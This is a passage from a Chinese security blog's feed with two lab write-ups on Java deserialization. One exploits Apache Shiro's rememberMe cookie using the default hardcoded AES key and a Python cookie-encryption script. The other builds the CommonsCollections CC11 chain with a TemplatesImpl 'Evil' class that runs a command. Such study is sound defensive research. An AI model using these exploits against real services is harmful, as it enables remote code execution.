    <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>直接克隆p牛的项目</p><p><a href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">https://github.com/phith0n/JavaThings/tree/master/shirodemo</a></p><p>配一下tomcat就可以直接运行了</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>运行项目, 访问<a href="http://localhost:8080/shirodemo_war/login.jsp">http://localhost:8080/shirodemo_war/login.jsp</a></p><p>默认登录为username&#x3D;root&amp;password&#x3D;secret</p><p>勾选RemberMe, 成功登录会返回set-Cookie: rememberMe&#x3D;xxx</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240822202613041.png" alt="image-20240822202613041"></p><p>之后的请求就会带着这个cookie</p><p>而这个cookie就是存在反序列化漏洞的地方, 但是它经过了某种加密</p><p>寻找处理cookie的逻辑</p><p>在<code>org.apache.shiro.web.mgt.AbstractRememberMeManager#getRememberedSerializedIdentity</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240822232814207.png" alt="image-20240822232814207"></p><p>这里获取Cookie并判断是否等于<code>deleteMe</code>, 如果不是则返回解码后的内容</p><p>寻找调用<code>getRememberedSerializedIdentity</code>的地方</p><p>在<code>org.apache.shiro.web.mgt.AbstractRememberMeManager#getRememberedPrincipals</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240822233352367.png" alt="image-20240822233352367"></p><p>关键看这里的<code>onvertBytesToPrincipals</code>方法, 它把bytes转化为principals对象</p><p>跟进去看一下</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240822233511510.png" alt="image-20240822233511510"></p><p>很明显, 先解密, 再反序列化</p><h3 id="解密函数"><a href="#解密函数" class="headerlink" title="解密函数"></a>解密函数</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] decrypt(<span class="type">byte</span>[] encrypted) &#123;</span><br><span class="line">    <span class="type">byte</span>[] serialized = encrypted;</span><br><span class="line">    <span class="type">CipherService</span> <span class="variable">cipherService</span> <span class="operator">=</span> getCipherService();</span><br><span class="line">    <span class="keyword">if</span> (cipherService != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">byteSource</span> <span class="operator">=</span> cipherService.decrypt(encrypted, getDecryptionCipherKey());</span><br><span class="line">        serialized = byteSource.getBytes();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> serialized;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先看它的<code>getCipherService()</code>获取的是一个什么加密服务</p><p>跟进去是这样</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240822234236930.png" alt="image-20240822234236930"></p><p>我们搜索<code>cipherService</code>看他在哪里被赋值</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240822234321050.png" alt="image-20240822234321050"></p><p>发现再默认构造器对其赋值. 这是一个AES加密服务</p><p>并且后面的<code>getDecryptionCipherKey()</code>获取密钥也不用找了, 在构造器中设置了一个默认的常量key</p><p>点进去</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="反序列化函数"><a href="#反序列化函数" class="headerlink" title="反序列化函数"></a>反序列化函数</h3><p>接下来看看它是怎么反序列化的</p><p>点进去deserialize方法是这样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> PrincipalCollection <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] serializedIdentity)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> getSerializer().deserialize(serializedIdentity);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是getSerializer(), 同样的, 获得的这个Serializer在构造器中有默认值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">AbstractRememberMeManager</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.serializer = <span class="keyword">new</span> <span class="title class_">DefaultSerializer</span>&lt;PrincipalCollection&gt;();</span><br><span class="line">        <span class="built_in">this</span>.cipherService = <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        setCipherKey(DEFAULT_CIPHER_KEY_BYTES);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里deserialize是一个接口,那么执行的<code>deserialize</code>方法就是<code>DefaultSerializer</code>类中实现的<code>deserialize</code>方法</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240822235212707.png" alt="image-20240822235212707"></p><p>也是没有任何的防御措施, 理论上只要有依赖, 任何链子就都能打进去了</p><p>加密不太懂, 贴一下大神的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># －*-* coding:utf-8</span></span><br><span class="line"><span class="comment"># @Time    :  2022/7/13 17:36</span></span><br><span class="line"><span class="comment"># @Author  : Drunkbaby</span></span><br><span class="line"><span class="comment"># @FileName: poc.py</span></span><br><span class="line"><span class="comment"># @Software: VSCode</span></span><br><span class="line"><span class="comment"># @Blog    ：https://drun1baby.github.io/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> email.mime <span class="keyword">import</span> base</span><br><span class="line"><span class="keyword">from</span> pydoc <span class="keyword">import</span> plain</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> turtle <span class="keyword">import</span> mode</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file_data</span>(<span class="params">filename</span>):</span><br><span class="line"> <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"> data = f.read()</span><br><span class="line"> <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_enc</span>(<span class="params">data</span>):</span><br><span class="line"> BS = AES.block_size</span><br><span class="line"> pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line"> key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line"> mode = AES.MODE_CBC</span><br><span class="line"> iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line"> encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line"> ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))</span><br><span class="line"> <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_dec</span>(<span class="params">enc_data</span>):</span><br><span class="line"> enc_data = base64.b64decode(enc_data)</span><br><span class="line"> unpad = <span class="keyword">lambda</span> s: s[:-s[-<span class="number">1</span>]]</span><br><span class="line"> key = <span class="string">&quot; &quot;</span></span><br><span class="line"> mode = AES.MODE_CBC</span><br><span class="line"> iv = enc_data[:<span class="number">16</span>]</span><br><span class="line"> encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line"> plaintext = encryptor.decrypt(enc_data[<span class="number">16</span>:])</span><br><span class="line"> plaintext = unpad(plaintext)</span><br><span class="line"> <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"> data = get_file_data(<span class="string">&quot;ser.bin&quot;</span>)</span><br><span class="line"> <span class="built_in">print</span>(aes_enc(data))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当我尝试CC1时发现这里报了一个错导致不成功</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240823141018860.png" alt="image-20240823141018860"></p><p>Transformer数组似乎无法被反序列化</p><p>之后又尝试CB链子还是爆错:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.io.InvalidClassException: org.apache.commons.beanutils.BeanComparator; local class incompatible: stream classdesc serialVersionUID = -2044202215314119608, local class serialVersionUID = -3490850999041592962</span><br></pre></td></tr></table></figure><p>得知是版本问题</p><blockquote><p>如果两个不同版本的库使用了同一个类，而这两个类可能有一些方法和属性有了变化，此时在序列化通信的时候就可能因为不兼容导致出现隐患。因此，Java在反序列化的时候提供了一个机制，序列化时会根据固定算法计算出一个当前类的 <code>serialVersionUID</code> 值，写入数据流中；反序列化时，如果发现对方的环境中这个类计算出的 <code>serialVersionUID</code> 不同，则反序列化就会异常退出，避免后续的未知隐患。</p></blockquote><p>服务端的cb版本是1.8.3, 而我使用1.9.2版本序列化数据导致错误</p><p>用对应的版本就可以了</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240823144456939.png" alt="image-20240823144456939"></p><p>至于cc为什么没有成功</p><blockquote><p>commons-beanutils本来依赖于commons-collections，但是在Shiro中，它的commons-beanutils虽然包含了一部分commons-collections的类，但却不全。这也导致，正常使用Shiro的时候不需要依赖于commons-collections，但反序列化利用的时候需要依赖于commons-collections。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h2&gt;&lt;p&gt;直接克隆p牛的项目&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/phith0n/JavaThings/tree/m</summary>
      
    
    
    
    
    <category term="Java安全" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>遗漏的CC11和CommonsBeanUtils链</title>
    <link href="http://example.com/2024/07/22/%E7%9A%84CC11%E5%92%8CCommonsBeanUtils%E9%93%BE/"/>
    <id>http://example.com/2024/07/22/%E7%9A%84CC11%E5%92%8CCommonsBeanUtils%E9%93%BE/</id>
    <published>2024-07-22T06:15:39.000Z</published>
    <updated>2024-07-25T09:29:17.580Z</updated>
    
    <content type="html"><![CDATA[<h1 id="遗漏的CC11和CommonsBeanUtils链"><a href="#遗漏的CC11和CommonsBeanUtils链" class="headerlink" title="遗漏的CC11和CommonsBeanUtils链"></a>遗漏的CC11和CommonsBeanUtils链</h1><p>之前我写了一篇专门分析cc链子的博客, 没有包含这位两条链子, 这里进行补充</p><h2 id="CC11"><a href="#CC11" class="headerlink" title="CC11"></a>CC11</h2><p>cc11对java版本没有限制, 我依然使用的是经典的jdk8u65</p><p>仍然是经典的cc依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>相信大家对这个版本已经是非常熟悉了, 这里就不多赘述了</p><p>cc11实际上是前面我们分析过的链子拼接来的, 它是利用的动态类加载</p><p>首先回忆一下, 在java核心库中, com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl这个类是可以进行任意类加载的, 我在cc3中首次分析了这个类的利用, 这里cc11也是利用了这个类并结合cc6的首部来触发</p><p>让我们再来分析一遍</p><p>首先找到com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl这个类, 他有一个defineClass方法</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240722230820146.png" alt="image-20240722230820146"></p><p>这个方法返回一个类, 也就是一个动态类加载</p><p>我们找谁调用了这个方法</p><p>很容易找到在同一个类下有一次调用</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240722230947998.png" alt="image-20240722230947998"></p><p>可这个defineTransletClasses依然是一个私有类型, 我们不能用cc6来调用这个方法, 所以继续寻找谁调用了defineTransletClasses方法</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240722231426843.png" alt="image-20240722231426843"></p><p>我们可以找到getTransletInstance这个类, 不过它依然是私有</p><p>继续寻找</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240722231657354.png" alt="image-20240722231657354"></p><p>这个newTransformer就是可以从外部访问的了</p><p>至此大概流程是这样的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240722232705864.png" alt="image-20240722232705864"></p><p>这里需要注意的几个点就是一些必要的赋值, 之前在CC3中也分析过了, 这里再简单看一遍</p><p>newTransformer到getTransletInstance没有什么判断</p><p>看getTransletInstance到defineTransletClasses</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240722231426843.png" alt="image-20240722231426843"></p><p>两个if判断, 要进入defineTransletClasses就需要_name不为null, _class为null</p><p>我们ctrl+鼠标左点到上面可以看见这两个属性的类型</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240723124531024.png" alt="image-20240723124531024"></p><p>按照要求反射赋值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="type">Field</span> <span class="variable">cls</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        cls.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        cls.set(templates, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>接下来是defineTransletClasses到defineClass这一步</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240722230947998.png" alt="image-20240722230947998"></p><p>这里的_bytecodes就是我们要加载类的字节码</p><p>注意它的类型是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[][] _bytecodes = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><p>首先我们先编译一个恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;CC11&quot;</span>);<span class="comment">//不会执行</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用javac编译后获取它的字节码并赋值给_bytecodes</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\tmp\\Evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br></pre></td></tr></table></figure><p>至此这里似乎就已经通了, 我们先直接调用newTransformer()试试</p><p>发现会报错</p><p>定位到最后错误的这一行</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240723131418268.png" alt="image-20240723131418268"></p><p>打断点调试</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240723131511941.png" alt="image-20240723131511941"></p><p>发现这里_tfactory是空, 导致报错出错误了</p><p>我们去看这个_tfactory的定义</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="type">TransformerFactoryImpl</span> <span class="variable">_tfactory</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><p>transient修饰使得_tfactory不被序列化进数据流, 所以即使现在我们反射给它赋值了, 序列化后它还是空值</p><p>我们不妨看看这个属性是否在其他地方进行了赋值</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240723132345064.png" alt="image-20240723132345064"></p><p>我们在该类的<code>readObject</code>方法中发现了一次赋值, 也就是说, 实际上我们根本不需要对他赋值, 反序列化后会自动给_tfactory赋值</p><p>这里我们先反射赋一个相同的值测试这一段链子是否流通</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>());</span><br></pre></td></tr></table></figure><p>再次测试, 发现还是报错</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240723133534887.png" alt="image-20240723133534887"></p><p>我们点击Creat breakpoint在抛出空指针错误的地方打断点</p><p>debug一下</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240723133820653.png" alt="image-20240723133820653"></p><p>发现这个if里面会判断恶意类的父类必须是<code>ABSTRACT_TRANSLET</code>,  不然会去else里导致抛出错误, 我们点进去看看这个ABSTRACT_TRANSLET</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240723134348495.png" alt="image-20240723134348495"></p><p>所以需要将恶意类继承com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</p><p>继承这个类需要实现对应的方法, 用idea自动帮我们实现就行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;CC11&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>再次测试, 就可以弹出计算器啦!!!</p><p>至此后半链子就完成了</p><p>贴一下exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC11</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, TransformerConfigurationException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\tmp\\Evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">cls</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        cls.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        cls.set(templates, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        templates.newTransformer();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来就是要拼接上CC6的前半链子</p><p>我们先看一下CC6这条链子是什么样的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330121419699.png" alt="image-20240330121419699"></p><p>我们只需要执行调用newTransformer()这一个方法即可</p><p>所以大概流程就是这样</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240723142611703.png" alt="image-20240723142611703"></p><p>不过实际上可以简化一部, 我们可以不使用HashSet.readObject() 作为入口, </p><p>在HashMap.readObject()的最后有这样一部调用</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240723234352058.png" alt="image-20240723234352058"></p><p>这里可以直接调用到HashMap.hash(), 因此:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240723234431270.png" 